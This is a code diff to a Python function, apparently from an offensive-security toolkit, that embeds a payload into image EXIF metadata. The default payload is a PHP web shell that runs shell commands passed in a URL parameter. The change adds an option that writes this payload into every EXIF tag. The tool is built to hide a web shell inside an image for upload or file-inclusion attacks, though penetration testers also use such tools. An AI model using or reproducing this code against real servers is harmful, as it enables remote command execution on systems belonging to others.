@@ -118,20 +118,28 @@ def exifImage(payload="<?php system($_GET['c']);?>", _in=None, _out=None, exif_t
         print("Invalid input. Either give an Image or a path to an image.")
         return
 
+    valid_tags = list(exif._constants.ATTRIBUTE_NAME_MAP.values())
     if exif_tag is None:
         exif_tag = "image_description"
+    elif exif_tag == "all":
+        for exif_tag in valid_tags:
+            try:
+                _in[exif_tag] = payload
+                print("adding:", exif_tag)
+            except Exception as e:
+                pass
     else:
-        valid_tags = dir(_in)
-
         if exif_tag not in valid_tags:
             print("Invalid exif-tag. Choose one of the following:")
             print(", ".join(valid_tags))
             return
 
-    _in[exif_tag] = payload
+        _in[exif_tag] = payload
+
     if _out is None:
         sys.stdout.write(_in.get_file())
         sys.stdout.flush()
+
     elif isinstance(_out, str):
         with open(_out, "wb") as f:
             f.write(_in.get_file())
